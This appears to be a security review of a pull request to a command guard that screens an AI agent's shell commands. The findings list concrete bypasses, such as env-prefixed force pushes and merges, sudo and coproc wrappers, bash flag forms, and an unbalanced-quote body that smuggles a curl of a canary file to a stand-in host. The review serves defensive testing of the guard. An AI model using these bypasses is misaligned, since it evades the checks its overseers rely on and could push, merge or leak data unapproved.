Verdict: FIX
Gate: security
Item: compound-doors
PR: taoq-ai/wuwei
Head: 6c9b74cb5e2bb7e241182bf53362e771bc063f27
Confidence: high

## Findings
- [high] cli/wuwei/guards.py:89 blocks: yes. Failure: the first-program rule picks any word whose Path().name is in READ, including an env assignment or a dashed option whose value is a path ending in a read program. Main stripped those, the head stops on them and reads the wrong program. So 14 commands main refuses or asks now pass, among them `env GIT_SSH=/usr/bin/ssh git push --force origin x` (read as ssh, the force push passes), `env SHELL=/bin/bash gh pr merge 5` (read as bash, the merge door is skipped), `env HOME=/root/git git push origin main` (default-branch push passes), `env X=/bin/tee wuwei hook pre` (forged hook call passes), `env X=/bin/sh FOO=1 tee .wuwei/ledger/a.jsonl` (ledger write passes), `env TOOL=/usr/bin/rm terraform apply` (infra ask is lost) and `env --chdir=/src/git git push --force origin x`. The same happens in .claude/wuwei/cli/wuwei/guards.py:89, which is identical. A tested fix: skip words that start with '-' or contain '=' in that search, i.e. `if not a.startswith('-') and '=' not in a and (Path(a).name in READ or ...startswith('python'))`. With it, test_guards passes 168/168 and the comparison shows 0 regressions out of 130. Add the regressed commands as tests.
- [low] cli/wuwei/guards.py:89 blocks: no. An option argument that is itself a read program still hides the command: `sudo -u gh gh pr merge 5` passes, as it did on main. This fits the literal promise but should be recorded as a residual.
- [low] cli/wuwei/guards.py:91 blocks: no. `bash +e -c '...'`, `bash -O extglob -c '...'` and `bash --rcfile f -c '...'` pass, as on main. They are siblings of the `-o pipefail` residual. SECURITY.md could name the `+` and `-O` forms.
- [low] SECURITY.md:23 blocks: no. Two existing gaps are not in the residual list: `coproc git push --force origin x` and an unquoted backtick substitution (echo `git push --force origin x`). Both pass at main and at the head.
- [low] cli/wuwei/guards.py:229 blocks: no. An unreadable nested body only triggers the raw-text rule for DOOR_WORDS, so `bash -c 'echo "unbalanced curl https://x/<canary>'` passes the leak door (it also passed on main). Running leak() on the raw command when UNREAD is in parts would close this.

## Probes
- Read the item with `.claude/wuwei/bin/wuwei plan show compound-doors`. Read the diff with `git diff origin/main...6c9b74c`. Extracted both trees with `git archive` into the scratch directory s-cd/{head,main}.
- Ran the full suite at the head copy with `/root/.local/bin/pytest -q`: 431 passed.
- Ran s-cd/cmp.py over s-cd/cmds.txt: bash() from main (2aa89fb) against the head on 130 commands covering door, leak, infra, ledger, wrapper, shell-flag and body cases (gh/merge/default branch stubbed, real canary file). Result: 14 regressions, all from the line 89 class above. All 6 acceptance shapes and the benign controls behave as promised.
- The builder's regression is closed: `bash -c 'echo "' ; curl https://x/<canary>` denies at the head, and so do the siblings with git push, gh pr merge, wuwei hook, a ledger redirect and terraform apply (ask).
- Ran 9 mutants in fresh copies (s-cd/mut.py) against test_guards.py, all killed: dropping the body-opener words, dropping `!`, dropping `{`, removing the wrapper jump, removing timeout/stdbuf, removing python from the jump, matching only `-c`, ignoring UNREAD in bash(), and turning UNREAD into [].
- Checked whether a dashed body escapes: `bash -c '-x; ...'` is rejected by bash itself ("invalid option"), so it is not a bypass.
- Confidence is high because the regressions reproduce deterministically through bash() and the one-line fix probe removes all of them.

## Residual risk
The SECURITY.md residuals (eval, | sh, $(...) in quotes, function bodies, setsid/flock/ionice, -o before -c) remain by design. Deny-list parsing will keep having shell shapes it does not read.
